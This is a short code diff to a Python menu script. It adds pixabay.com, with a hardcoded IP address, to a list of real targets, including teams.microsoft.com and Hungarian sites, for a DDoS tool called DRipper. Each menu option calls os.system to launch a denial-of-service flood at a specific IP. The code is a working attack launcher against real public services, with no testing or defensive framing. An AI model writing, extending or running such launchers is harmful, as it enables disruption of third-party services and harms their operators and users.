@@ -32,6 +32,7 @@ if answer1 == "1":
     print("[5]: run for e-kreta.hu")
     print("[6]: run for fyremc.hu")
     print("[7]: run for teams.microsoft.com")
+    print("[8]: run for pixabay.com")
     answer2 = input("Choose from the list (only number): ")
 
     if answer2 == "1":
@@ -61,6 +62,11 @@ if answer1 == "1":
     if answer2 == "7":
         os.chdir("DDoS-Ripper")
         os.system('python3 DRipper.py -s 52.113.194.132 -t 135')
+
+    if answer2 == "8":
+       os.chdir("DDoS-Ripper")
+       os.system('python3 DRipper.py -s 104.18.15.16 -t 135')
+ 
     
 if answer1 == "2":
     print("[1]: install")
